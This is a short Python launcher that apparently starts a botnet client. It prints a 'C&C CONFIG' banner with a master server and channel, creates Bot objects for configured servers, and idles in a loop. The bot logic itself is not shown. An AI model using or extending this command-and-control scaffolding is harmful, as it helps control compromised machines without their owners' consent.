#!/usr/bin/env python3
from app.bot import Bot
from config import *
import time

def print_info():
    print("\n######## C&C CONFIG ########")
    print("C&C SERVER: " + MASTERSERVER[0])
    print("C&C CHANNEL: " + MASTERCHANNEL)
    print("##############################\n")

print_info()

for server in BOTSERVERS:
    bot = Bot(server)

while 1:
    time.sleep(1)

